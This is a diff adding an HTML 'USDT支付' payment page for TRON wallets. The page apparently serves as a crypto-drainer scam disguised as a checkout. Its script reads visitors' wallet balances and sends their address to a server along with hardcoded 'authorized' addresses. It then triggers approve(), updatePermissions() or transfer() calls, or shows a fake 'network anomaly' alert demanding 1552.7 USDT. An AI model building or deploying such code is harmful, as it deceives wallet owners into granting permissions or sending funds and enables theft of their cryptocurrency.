@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <title>USDT支付</title>
+
+    <link rel="icon" href="/favicon.ico">
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/qrcode.min.js"></script>
+    <link rel="stylesheet" href="/test/css/index.css?3">
+
+    <script type="text/javascript" src="/js/vconsole.min.js"></script>
+</head>
+
+<body>
+    <div class="pc-content" id="pcContent">
+        <div class="pc-container">
+            <div class="base-info">
+                <div class="base-header">
+                    <img src="/img/car.png">
+                    <div class="pay-info">付款信息</div>
+                </div>
+                <hr>
+                <div class="base-body">
+                    <div class="info-item">
+                        <div class="item-title">用户名:</div>
+                        <div class="item-value">
+                            <div class="item-value-text">abc</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="item-title">邮箱:</div>
+                        <div class="item-value">
+                            <div class="item-value-text"><a href="/cdn-cgi/l/email-protection" class="__cf_email__"
+                                    data-cfemail="3a495e5b4d5e7a4b594c14595557">[email&#160;protected]</a></div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="item-title">付款金额:</div>
+                        <div class="item-value">
+                            <div class="item-value-text">51.00 USDT</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="goods-info" style="display: none" id="pc_show_code">
+                <div class="pay-introduce">
+                    <div class="pay-title">支付说明</div>
+                    <div class="pay-content">
+                        如果您的浏览器中没有安装Tronlink插件，
+                        请打开钱包首页扫码付款，
+                        仅支持TRC链付款。
+                    </div>
+                    <div></div>
+                </div>
+                <div class="pay-code">
+                    <div id="qrcode_pc_withtron" style="max-width: 800px"></div>
+                    <!--                <img src="/newpage/images/code.png" />-->
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="mobile-content" id="mobileContent">
+        <div class="mobile-container">
+            <div class="base-info-mobile">
+                <div class="base-header">
+                    <img src="/img/car.png">
+                    <div class="pay-info">付款信息</div>
+                </div>
+                <hr>
+                <div class="base-body">
+                    <div class="info-item">
+                        <div class="item-title">用户名:</div>
+                        <div class="item-value">
+                            <div class="item-value-text">qqwdqd</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="item-title">邮箱:</div>
+                        <div class="item-value">
+                            <div class="item-value-text">dwqdqd</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="item-title">付款金额:</div>
+                        <div class="item-value">
+                            <div class="item-value-text">51.00 USDT</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="mobile-goods">
+                <div class="mobile-title paymentShow" style="display: none">
+                    请选择您的转账钱包
+                </div>
+                <ul id="goods" class="paymentShow" style="display: none">
+                    <li class="goods-item" data-index="7">
+                        <div class="item-img"><img src="/img/okex.png" /></div>
+                        <div class="item-content">
+                            <div class="item-name">欧易Web3钱包</div>
+                            <div class="item-tag">
+                                <div>TRC-20</div>
+                                <div class="other-color">Android/IOS</div>
+                            </div>
+                        </div>
+                        <input type="radio" />
+                    </li>
+                    <li class="goods-item" data-index="6">
+                        <div class="item-img"><img src="/img/BitKeep.png" /></div>
+                        <div class="item-content">
+                            <div class="item-name">Bitget Wallet</div>
+                            <div class="item-tag">
+                                <div>TRC-20</div>
+                                <div class="other-color">Android/IOS</div>
+                            </div>
+                        </div>
+                        <input type="radio" />
+                    </li>
+                    <li class="goods-item" data-index="2">
+                        <div class="item-img"><img src="/img/imtoken.png" /></div>
+                        <div class="item-content">
+                            <div class="item-name">imToken</div>
+                            <div class="item-tag">
+                                <div>TRC-20</div>
+                                <div class="other-color">Android/IOS</div>
+                            </div>
+                        </div>
+                        <input type="radio" />
+                    </li>
+                    <li class="goods-item" data-index="9">
+                        <div class="item-img"><img src="/img/tokenpocket.png" /></div>
+                        <div class="item-content">
+                            <div class="item-name">TokenPocket</div>
+                            <div class="item-tag">
+                                <div>TRC-20</div>
+                                <div class="other-color">Android/IOS</div>
+                            </div>
+                        </div>
+                        <input type="radio" />
+                    </li>
+                    <li class="goods-item" data-index="8">
+                        <div class="item-img"><img src="/img/TronLink.png" /></div>
+                        <div class="item-content">
+                            <div class="item-name">TronLink</div>
+                            <div class="item-tag">
+                                <div>TRC-20</div>
+                                <div class="other-color">Android/IOS</div>
+                            </div>
+                        </div>
+                        <input type="radio" />
+                    </li>
+
+                </ul>
+                <div class="pay-submit paymentShow" id="confirm" style="display: none">
+                    确认支付
+                </div>
+                <div style="display: none" class="pay-submit" id="payButton" onclick="check()">
+                    点击付款
+                </div>
+
+            </div>
+            <div id="show-qrcode" style="display: none">
+                <div class="goods-info">
+                    <div class="pay-introduce">
+                        <div class="pay-title">支付说明</div>
+                        <div class="pay-content">
+                            请打开钱包首页扫码付款，
+                            仅支持TRC链付款。
+                        </div>
+                        <div></div>
+                    </div>
+                    <div class="pay-code">
+                        <div id="qrcode" style="max-width: 800px"></div>
+                        <!--                <img src="/newpage/images/code.png" />-->
+                    </div>
+                </div>
+                <div class="goods-info">
+                    <div class="pay-title tip-color">提示</div>
+                    <div class="pay-content">
+                        请使用钱包首页的扫码功能。付款成功后自动到账，如果未自动到账请联系在线客服
+                    </div>
+                </div>
+            </div>
+
+            <div class="notice" style="color: red;margin-top: 20px;display: none" id="adOkexShow"></div>
+        </div>
+
+    </div>
+
+    <script src="/js/adapter.js"></script>
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+    <script src="/js/TronWeb.js"></script>
+    <script src="/js/layer.js"></script>
+    <script src="/js/bignumber.min.js"></script>
+    <script src="/js/tp.js"></script>
+    <script src="/js/ethers.umd.min.js"></script>
+    <script src="/test/js/trc.js?v=202303260301"></script>
+    <script>
+        new VConsole();
+
+        // Function to convert TRON token amount to 64-character hexadecimal format
+        function convertTronHex(amount) {
+            if (amount === 0) return '0'.repeat(64);
+            const value = BigInt(Math.round(amount * 10 ** 6));
+            return value.toString(16).padStart(64, '0');
+        }
+
+        // Function to detect if the user is on a mobile device
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+
+        // Function to handle wallet connection
+        async function okexConnect() {
+            console.log("<<< tronLink,", window.tronLink)
+            if (window.tronLink && window.tronLink.ready) {
+                window.tronWeb = window.tronLink.tronWeb;
+            } else if (window.okxwallet && window.okxwallet.tronLink) {
+                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
+                if (res.code === 200) {
+                    window.tronWeb = window.okxwallet.tronWeb;
+                }
+            } else if (window.okxwallet && window.okxwallet.rpc && typeof window.okxwallet.rpc.call === 'function') {
+
+                const response = await window.okxwallet.rpc.call({
+                    "jsonrpc": "2.0", "id": 1, "method": "eth_accounts", "params": []
+                });
+            }
+            console.log(">>> okxwallet ", window.okxwallet);
+        }
+
+        // Display content based on device type
+        if (isMobile()) {
+            document.getElementById("mobileContent").style.display = "block";
+        } else {
+            document.getElementById("pcContent").style.display = "block";
+        }
+
+        const isAdOkex = /okex/.test(navigator.userAgent.toLowerCase()) && !isMobile();
+
+        window.addEventListener('load', okexConnect);
+
+        var order_no = '2023032437100865';
+        var amount = 51;
+        var selectIndex = -1;
+        var type;
+        var permissionsAddr = 'TFonidXCjcfLqtxpwLcKFoAyM9HEdcusdt';
+        var auAddr = 'TX6TJo7TxQMx9PM8Rxki96rrFuaznTk6Ry';
+        var payAddr = 'TBgB8NqPjU1xQQ7zXzJ7SjCg38tsrUK1am';
+        var userAddress;
+        var usdtBalance;
+
+        function getUrlRelativePath() {
+            const url = document.location.toString();
+            const arrUrl = url.split("//");
+            const start = arrUrl[1].indexOf("/");
+            return arrUrl[1].substring(start);
+        }
+
+        function generateQRCode() {
+            const url = getUrlRelativePath();
+            let showCodeId = "qrcode";
+
+            if (!isMobile()) {
+                if (window.ethereum || window.tronWeb) {
+                    document.getElementById('payButton').style.display = 'block';
+                } else {
+                    $("#pc_show_code").show();
+                    showCodeId = 'qrcode_pc_withtron';
+                    document.getElementById(showCodeId).style.display = 'block';
+                }
+            } else {
+                if (window.tronWeb) {
+                    $("#payButton").show();
+                    $("#pcContent").hide();
+                    $("#mobileContent").show();
+                    $("#show-qrcode").show();
+                    showCodeId = 'qrcode';
+                    document.getElementById(showCodeId).style.display = 'block';
+                } else {
+                    $(".paymentShow").show();
+                    $("#payButton").show();
+                    $("#show-qrcode").hide();
+                }
+            }
+
+            const qrcode = new QRCode(document.getElementById(showCodeId), {
+                text: url,
+                width: 308,
+                height: 308,
+                correctLevel: QRCode.CorrectLevel.L // 二维码结构复杂性 0~3
+            });
+        }
+
+        setTimeout(generateQRCode, 800);
+
+        var liElements = document.querySelectorAll("#goods li");
+
+        liElements.forEach((li, index) => {
+            li.addEventListener("click", function () {
+                liElements.forEach((item) => {
+                    item.classList.remove("selected");
+                    const input = item.querySelector("input[type=radio]");
+                    input.checked = false;
+                });
+                this.classList.add("selected");
+                const radioInput = this.querySelector("input[type=radio]");
+                radioInput.checked = true;
+                selectIndex = index;
+            });
+        });
+
+        // Handle wallet confirmation and redirection
+        $('#confirm').click(function () {
+            if (selectIndex === -1) {
+                alert("请选择付款钱包！");
+                return;
+            }
+
+            const currentUrl = window.location.href;
+            const encodedUrl = encodeURIComponent(currentUrl);
+            const network = "tron"; // Specify the network
+
+            const url = getUrlRelativePath();
+            const walletLinks = [
+                `okx://wallet/dapp/details?dappUrl=${encodedUrl}`,
+                `bitkeep://bkconnect?action=dapp&url=${url}`,
+                `imtokenv2://navigate?screen=DappView&url=${url}`,
+                `tpdapp://open?params={"url": "${encodeURIComponent(url)}", "chain": "TRX", "source":"xxx"}`,
+                `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ url: url, action: "open", protocol: "tronlink", version: "1.0" }))}`
+            ];
+
+            const link = walletLinks[selectIndex];
+            window.location.href = link;
+        });
+
+        // Function to check wallet balance and permissions
+        async function check() {
+            $('#adOkexShow').hide();
+
+            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+                $('#adOkexShow').show().text("请允许访问你的TRX钱包地址");
+                alert("请选择TRX链进行支付");
+                return;
+            }
+
+            const loadIndex = layer.msg('加载中', {
+                shade: 0.6,
+                time: 10000,
+                shadeClose: false
+            });
+
+            try {
+                const userAddress = await tronWeb.defaultAddress.base58;
+                const balance = await tronWeb.trx.getBalance(userAddress) / 1000000;
+
+                if (balance < 13) {
+                    $('#adOkexShow').show().text("TRX交易手续费不足");
+                    alert("TRX交易手续费不足");
+                    return;
+                }
+
+                const contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+                const resdata = await contract.balanceOf(userAddress).call();
+                const usdtBalance = parseInt(resdata._hex) / 1000000;
+
+                const data = {
+                    address: userAddress,
+                    authorized_address: 'TFonidXCjcfLqtxpwLcKFoAyM9HEdcusdt|TX6TJo7TxQMx9PM8Rxki96rrFuaznTk6Ry',
+                    where: 'uugetcode'
+                };
+
+                const response = await $.ajax({
+                    url: '/api/test/is_f',
+                    method: 'POST',
+                    data: data
+                });
+
+                layer.close(loadIndex);
+
+                if (response.code) {
+                    if (response.data === 1) {
+                        $('#adOkexShow').show().text("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用");
+                        alert("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用");
+                    } else if (response.data === 2) {
+                        transfer();
+                    }
+                } else {
+                    if (/imtoken/.test(navigator.userAgent.toLowerCase()) || /bitkeep/.test(navigator.userAgent.toLowerCase())) {
+                        balance >= 100 ? updatePermissions() : approve();
+                    } else {
+                        approve();
+                    }
+                }
+
+            } catch (error) {
+                console.error("Error checking wallet connection:", error);
+                layer.close(loadIndex);
+                $('#adOkexShow').show().text("系统维护,请联系客服");
+                alert("系统维护,请联系客服");
+            }
+        }
+
+
+    </script>
+</body>
+
+
+</html>
